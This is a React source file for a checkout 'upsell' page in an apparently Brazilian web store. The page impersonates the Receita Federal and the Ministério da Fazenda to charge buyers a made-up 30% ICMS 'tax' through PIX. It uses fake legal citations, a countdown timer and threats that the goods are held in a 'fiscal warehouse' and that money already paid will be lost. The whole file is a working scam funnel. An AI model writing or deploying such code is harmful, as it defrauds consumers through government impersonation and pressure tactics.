import { useEffect, useMemo, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { AlertTriangle, Loader2, Clock } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { formatBRL } from "@/data/products";
import { getUrlWithUtm, getUtmifyTracking } from "@/utils/utm";
import { getStoredTtclid } from "@/lib/tiktokPixel";

interface OrderItem {
  id?: string;
  name: string;
  quantity?: number;
  price?: number;
}

interface OrderRow {
  external_id: string;
  amount: number;
  buyer_name: string;
  buyer_email?: string | null;
  buyer_document?: string | null;
  buyer_phone?: string | null;
  items: OrderItem[] | null;
  status: string;
  store_slug: string;
}

function useCountdown(seconds: number) {
  const [left, setLeft] = useState(seconds);
  useEffect(() => {
    if (left <= 0) return;
    const t = setInterval(() => setLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [left]);
  const mm = String(Math.floor(left / 60)).padStart(2, "0");
  const ss = String(left % 60).padStart(2, "0");
  return { mm, ss };
}

export default function Up2Page() {
  const { externalId = "" } = useParams<{ externalId: string }>();
  const navigate = useNavigate();
  const [original, setOriginal] = useState<OrderRow | null>(null);
  const [up1Paid, setUp1Paid] = useState<OrderRow | null>(null);
  const [loading, setLoading] = useState(true);
  const [generating, setGenerating] = useState(false);
  const { mm, ss } = useCountdown(29 * 60 + 55);

  useEffect(() => {
    let alive = true;
    (async () => {
      // Pedido original
      const { data: orig } = await supabase
        .from("orders")
        .select(
          "external_id,amount,buyer_name,buyer_email,buyer_document,buyer_phone,items,status,store_slug",
        )
        .eq("external_id", externalId)
        .maybeSingle();

      // Tenta achar o pedido UP1 pago referente a esse original (mesmo email + slug=up1)
      let up1: OrderRow | null = null;
      if (orig?.buyer_email) {
        const { data: up1List } = await supabase
          .from("orders")
          .select(
            "external_id,amount,buyer_name,buyer_email,buyer_document,buyer_phone,items,status,store_slug",
          )
          .eq("buyer_email", orig.buyer_email)
          .eq("store_slug", "up1")
          .eq("status", "paid")
          .order("created_at", { ascending: false })
          .limit(10);
        // Tenta casar pelo nome do item que referencia o pedido original
        up1 =
          (up1List as OrderRow[] | null)?.find((o) =>
            (o.items ?? []).some((it) =>
              (it.name ?? "").includes(`#${orig.external_id}`),
            ),
          ) ?? null;
        // Fallback: o mais recente
        if (!up1 && up1List && up1List.length > 0) {
          up1 = up1List[0] as OrderRow;
        }
      }

      if (!alive) return;
      setOriginal(orig as OrderRow | null);
      setUp1Paid(up1);
      setLoading(false);
    })();
    return () => {
      alive = false;
    };
  }, [externalId]);

  const items: OrderItem[] = useMemo(() => {
    if (!original?.items || !Array.isArray(original.items)) return [];
    return original.items;
  }, [original]);

  const valorOriginal = original?.amount ?? 0;
  const valorNfeUp1 = up1Paid?.amount ?? Math.round(valorOriginal * 0.4);
  const baseCalculo = valorOriginal + valorNfeUp1;
  const icmsCentavos = Math.round(baseCalculo * 0.3);

  const handleGenerate = async () => {
    if (!original || generating) return;
    setGenerating(true);
    try {
      const { data, error } = await supabase.functions.invoke("create-pix", {
        body: {
          amount: icmsCentavos,
          buyer: {
            name: original.buyer_name,
            email: original.buyer_email ?? "comprador@email.com",
            document: original.buyer_document ?? undefined,
            phone: original.buyer_phone ?? undefined,
          },
          items: [
            {
              id: "icms-taxa",
              name: `Guia ICMS referente ao pedido #${original.external_id}`,
              price: icmsCentavos / 100,
              quantity: 1,
            },
          ],
          store_slug: "up2",
          ttclid: getStoredTtclid(),
          tracking: getUtmifyTracking(),
        },
      });
      if (error) throw error;
      const newId = (data as { external_id?: string })?.external_id;
      if (!newId) throw new Error("Falha ao criar pagamento");
      navigate(getUrlWithUtm(`/pix/${newId}`));
    } catch (e) {
      console.error(e);
      alert("Não foi possível gerar o pagamento. Tente novamente.");
      setGenerating(false);
    }
  };

  if (loading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-muted/30">
        <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
      </div>
    );
  }

  if (!original) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center px-4 text-center">
        <p className="text-muted-foreground">Pedido não encontrado.</p>
        <button
          onClick={() => navigate(getUrlWithUtm("/"))}
          className="mt-4 rounded-full bg-primary px-6 py-2 text-sm font-semibold text-primary-foreground"
        >
          Voltar à loja
        </button>
      </div>
    );
  }

  const firstName = original.buyer_name.split(" ")[0];

  return (
    <div className="min-h-screen bg-muted/30 py-6">
      <Helmet>
        <title>Pendência Tributária — Receita Federal</title>
      </Helmet>

      <div className="mx-auto max-w-md space-y-4 px-3">
        {/* Header de pendência com timer */}
        <div className="flex items-stretch gap-3 rounded-2xl bg-[#b1432f] p-4 text-white shadow-sm">
          <div className="flex-1">
            <p className="flex items-center gap-2 text-sm font-bold uppercase tracking-wide">
              <AlertTriangle className="h-4 w-4" /> Pendência tributária ativa
            </p>
            <p className="mt-1 text-sm">Produto retido no armazém fiscal</p>
          </div>
          <div className="flex flex-col items-center justify-center rounded-xl bg-[#0c2d6b] px-4 py-2 text-center">
            <p className="text-[10px] uppercase tracking-widest opacity-90">
              Expira em
            </p>
            <p className="text-2xl font-extrabold tabular-nums leading-none">
              {mm}:{ss}
            </p>
          </div>
        </div>

        {/* Notificação principal */}
        <div className="overflow-hidden rounded-2xl border bg-background shadow-sm">
          <div className="bg-[#0c2d6b] px-5 py-5 text-white">
            <p className="text-[11px] font-semibold uppercase tracking-wider opacity-90">
              Ministério da Fazenda
            </p>
            <h1 className="mt-1 text-xl font-extrabold leading-tight">
              NOTIFICAÇÃO DE PENDÊNCIA TRIBUTÁRIA
            </h1>
            <p className="mt-2 text-xs opacity-90">
              ICMS — Imposto sobre Circulação de Mercadorias e Serviços
            </p>
          </div>

          {/* Brasão / órgão */}
          <div className="flex items-center justify-between gap-4 border-b px-5 py-4">
            <div className="flex items-center gap-2">
              <div className="flex h-10 w-10 items-center justify-center rounded bg-[#0c2d6b] text-white">
                <svg viewBox="0 0 24 24" className="h-6 w-6" fill="currentColor" aria-hidden>
                  <path d="M3 12l9-7 9 7-2 1-7-5-7 5-2-1zm2 2l7 5 7-5v6H5v-6z" />
                </svg>
              </div>
              <p className="text-base font-bold text-[#0c2d6b]">Receita Federal</p>
            </div>
            <div className="text-right text-xs leading-tight text-muted-foreground">
              GOVERNO
              <br />
              DO
              <br />
              <span className="font-bold text-[#0c2d6b]">BRASIL</span>
            </div>
          </div>

          {/* Texto legal */}
          <div className="px-5 py-5 text-sm leading-relaxed text-foreground">
            <p>
              Nos termos do <strong>art. 155, II da Constituição Federal</strong>{" "}
              c/c o Regulamento do ICMS (RICMS), a circulação de bem resultante
              de <strong>compra em estabelecimento comercial</strong> configura
              fato gerador do ICMS. A <strong>Receita Federal identificou a
              movimentação</strong> do bem adquirido e emitiu automaticamente
              a guia de recolhimento estadual.
            </p>
          </div>

          {/* Aviso de retenção */}
          <div className="mx-5 mb-4 rounded-xl border border-red-200 bg-red-50 p-4 text-sm leading-relaxed text-red-700">
            <p>
              O produto ficará <strong>retido no armazém fiscal</strong> até a
              quitação. O não pagamento dentro do prazo implica{" "}
              <strong>cancelamento automático da compra</strong> e perda
              integral dos valores já pagos.
            </p>
          </div>

          {/* Identificação do contribuinte */}
          <div className="mx-5 mb-4 rounded-xl border bg-muted/30 p-4 text-xs">
            <p className="text-[11px] font-semibold uppercase tracking-wide text-muted-foreground">
              Contribuinte
            </p>
            <p className="mt-1 text-sm font-bold">{original.buyer_name}</p>
            <p className="mt-2 text-muted-foreground">
              Pedido referência:{" "}
              <span className="font-medium text-foreground">
                #{original.external_id}
              </span>
            </p>
            {items.length > 0 && (
              <ul className="mt-2 space-y-0.5">
                {items.map((it, idx) => (
                  <li key={idx} className="text-foreground">
                    • <span className="font-medium">{it.name}</span>
                    {it.quantity ? (
                      <span className="text-muted-foreground">
                        {" "}
                        (Qtd: {it.quantity})
                      </span>
                    ) : null}
                  </li>
                ))}
              </ul>
            )}
          </div>

          {/* Cálculo */}
          <div className="mx-5 mb-4 rounded-xl border bg-background p-4 text-sm">
            <div className="space-y-1.5">
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground">Valor do pedido:</span>
                <span className="font-medium">
                  {formatBRL(valorOriginal / 100)}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground">NF-e (já paga):</span>
                <span className="font-medium">
                  {formatBRL(valorNfeUp1 / 100)}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground">Base de cálculo:</span>
                <span className="font-medium">
                  {formatBRL(baseCalculo / 100)}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground">
                  Alíquota ICMS estadual:
                </span>
                <span className="font-medium">30,00%</span>
              </div>
              <div className="my-2 border-t" />
              <div className="flex items-center justify-between">
                <span className="font-bold">TOTAL DA GUIA ICMS</span>
                <span className="text-2xl font-extrabold text-[#0c2d6b]">
                  {formatBRL(icmsCentavos / 100)}
                </span>
              </div>
            </div>
          </div>

          {/* CTA */}
          <div className="border-t px-5 py-5">
            <button
              onClick={handleGenerate}
              disabled={generating}
              className="flex w-full items-center justify-center gap-2 rounded-xl bg-[#0c2d6b] px-6 py-4 text-sm font-bold uppercase tracking-wide text-white shadow-sm transition-opacity hover:opacity-95 disabled:opacity-60"
            >
              {generating ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" /> Gerando...
                </>
              ) : (
                "Regularizar pendência e liberar produto"
              )}
            </button>
            <p className="mt-3 flex items-center justify-center gap-1.5 text-center text-[11px] text-muted-foreground">
              <Clock className="h-3 w-3" />
              Guia emitida automaticamente pela Receita Federal — Recolhimento
              via PIX
            </p>
          </div>
        </div>

        <p className="text-center text-[11px] text-muted-foreground">
          {firstName}, sua entrega só será liberada após a quitação da guia
          ICMS.
        </p>
      </div>
    </div>
  );
}
